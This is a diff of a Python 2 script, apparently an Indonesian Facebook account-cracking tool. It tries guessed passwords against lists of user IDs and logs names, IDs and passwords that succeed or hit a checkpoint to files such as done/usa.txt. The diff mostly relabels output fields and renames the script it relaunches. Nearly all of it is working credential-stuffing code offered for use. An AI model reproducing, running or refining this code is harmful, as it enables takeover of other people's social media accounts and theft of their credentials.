@@ -1015,20 +1015,20 @@ def pilih_usa():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/usa.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos2
                     cek = open('done/usa.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -1037,20 +1037,20 @@ def pilih_usa():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/usa.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos3
                         cek = open('done/usa.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -1059,20 +1059,20 @@ def pilih_usa():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/usa.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos4
                             cek = open('done/usa.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -1081,20 +1081,20 @@ def pilih_usa():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/usa.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos5
                                 cek = open('done/usa.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     > ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
         except:
@@ -1108,7 +1108,7 @@ def pilih_usa():
     print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/usa.txt'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     raw_input('\x1b[1;97m{<\x1b[1;95mKembali\x1b[1;97m>}')
-    os.system('python2 cr4ck.py')
+    os.system('python2 roy-scold.py')
 
 
 def crack_pakis():
@@ -1226,20 +1226,20 @@ def pilih_pakis():
             ko = json.load(data)
             if 'access_token' in ko:
                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos1
                 oke = open('done/pakis.txt', 'a')
-                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
                 print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos1
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos1
                 cek = open('done/pakis.txt', 'a')
-                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
+                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
                 cekpoint.append(zowe)
             else:
@@ -1248,20 +1248,20 @@ def pilih_pakis():
                 ko = json.load(data)
                 if 'access_token' in ko:
                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos2
                     oke = open('done/pakis.txt', 'a')
-                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
                     print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos2
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos2
                     cek = open('done/pakis.txt', 'a')
-                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
+                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
                     cekpoint.append(zowe)
                 else:
@@ -1270,20 +1270,20 @@ def pilih_pakis():
                     ko = json.load(data)
                     if 'access_token' in ko:
                         print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos3
                         oke = open('done/pakis.txt', 'a')
-                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
                         print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos3
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos3
                         cek = open('done/pakis.txt', 'a')
-                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
+                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
                         cekpoint.append(zowe)
                     else:
@@ -1292,20 +1292,20 @@ def pilih_pakis():
                         ko = json.load(data)
                         if 'access_token' in ko:
                             print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos4
                             oke = open('done/pakis.txt', 'a')
-                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
                             print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos4
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos4
                             cek = open('done/pakis.txt', 'a')
-                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
+                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
                             cekpoint.append(zowe)
                         else:
@@ -1314,20 +1314,20 @@ def pilih_pakis():
                             ko = json.load(data)
                             if 'access_token' in ko:
                                 print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos5
                                 oke = open('done/pakis.txt', 'a')
-                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
                                 print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos5
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos5
                                 cek = open('done/pakis.txt', 'a')
-                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
+                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
                                 cekpoint.append(zowe)
                             else:
@@ -1336,20 +1336,20 @@ def pilih_pakis():
                                 ko = json.load(data)
                                 if 'access_token' in ko:
                                     print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;92m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;92m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;92m' + bos6
                                     oke = open('done/pakis.txt', 'a')
-                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
+                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     oke.close()
                                     oks.append(zowe)
